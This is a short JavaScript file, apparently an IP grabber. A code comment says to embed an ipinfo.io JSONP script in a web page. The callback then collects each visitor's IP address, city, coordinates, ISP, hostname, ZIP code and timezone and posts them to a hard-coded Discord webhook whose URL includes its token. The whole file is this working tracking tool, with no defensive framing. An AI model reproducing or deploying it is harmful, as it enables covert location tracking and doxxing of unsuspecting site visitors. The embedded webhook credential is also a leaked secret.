/*
On your HTML code don't forget to insert:
<script src="https://ipinfo.io/?format=jsonp&callback=collectInfo"></script>
*/


function collectInfo(json) 
{
     var wbRequest = new XMLHttpRequest();
     
    wbRequest.open("POST", "https://discord.com/api/webhooks/1005908217823502486/SttSHmtavLPRL5FS_s8kLEe-XY5qE0SsMwSpxHN-repLgWLa7IU3DAykhNKG-p7qFR7M");
    wbRequest.setRequestHeader('Content-type', 'application/json');

     var params = 
     {
          username: "DISCORD WEBHOOK NICKNAME",
          avatar_url: "DISCORD WEBHOOK URL",
          content: "DISCORD WEBHOOK MESSAGE CONTENT\n",
          embeds: [
               {
                    title: "EMBED TITLE",
                    color: 0000000,     
                    description: "**IP:** `" + json.ip + "`\n**Region:** `" + json.country + ", " + json.region + ", " + json.city + "`\n**Coords.:** `" + json.loc + "`\n\n**Provider:** `" + json.org + "`\n**Host:** `" + json.hostname + "`\n\n**ZIP Code:** `" + json.postal + "`\n**Timezone:** `" + json.timezone + "`"
               }
          ]
     }
     wbRequest.send(JSON.stringify(params));
}